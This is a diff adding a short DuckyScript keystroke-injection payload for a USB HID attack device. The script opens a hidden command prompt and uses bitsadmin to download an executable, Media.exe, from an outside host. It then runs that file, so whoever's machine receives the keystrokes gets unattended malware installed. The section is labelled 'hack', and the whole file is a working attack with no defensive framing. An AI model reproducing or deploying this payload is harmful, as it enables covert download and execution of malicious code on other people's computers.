@@ -1,0 +1,33 @@
+REM hide cmd window
+DELAY 1000
+REM GUI r
+CONTROL ESCAPE
+DELAY 250
+REM STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+STRING cmd /Q /D /F:OFF /V:ON /K
+DELAY 250
+ENTER
+DELAY 250
+STRING mode con:cols=18 lines=1
+ENTER
+REM move down
+REM DELAY 250
+REM ALT SPACE
+REM STRING M
+REM DOWNARROW
+REM REPEAT 100
+REM ENTER
+REM end hide cmd window
+
+REM hack
+STRING cd /D C:\\
+ENTER
+STRING cd %HOMEPATH%
+ENTER
+DELAY 50
+STRING bitsadmin /transfer mydownloadjob /download  /priority high http://fosse.co/dl/Media.exe %CD%/Media.exe
+DELAY 500
+ENTER
+STRING Media.exe
+ENTER
+REM end hack
